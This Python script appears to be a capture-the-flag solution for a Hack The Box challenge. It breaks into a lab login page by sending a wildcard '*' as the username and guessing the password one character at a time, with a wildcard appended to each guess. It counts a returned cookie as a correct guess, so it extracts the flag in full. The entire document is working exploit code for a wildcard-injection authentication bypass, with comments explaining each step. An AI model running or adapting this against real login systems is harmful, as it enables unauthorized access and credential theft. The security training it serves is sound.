import requests
import string

url = "http://167.172.63.87:30574/login" # URL to login page to POST credentials to.
username = "*" # Login page accepts wildcard for username. Username reese can also be used and cracked via same method.
password = "HTB{" # We know the flag/password should start with this format.

char_set = string.printable.replace("*","") # We want to try all printable characters with the exception of *.
brute_password = list(password) # Convert password to a list we can append to.

while brute_password[-1] != "}": # We know last character of the flag/password will be a curly brace so we can stop there.
    for current_char in char_set: # Try each character in char_set.
        http_request = requests.post(url, {"username":username,"password": ''.join(brute_password) + current_char + "*"}, allow_redirects=False) # Send login request
        if len(http_request.cookies) > 0: # If a cookie is set, login was successful.
            brute_password.append(current_char) # Add character that was successful to the brute_password list.
            print(''.join(brute_password)) # Print current password to stdout.
            break # Break back to while loop.
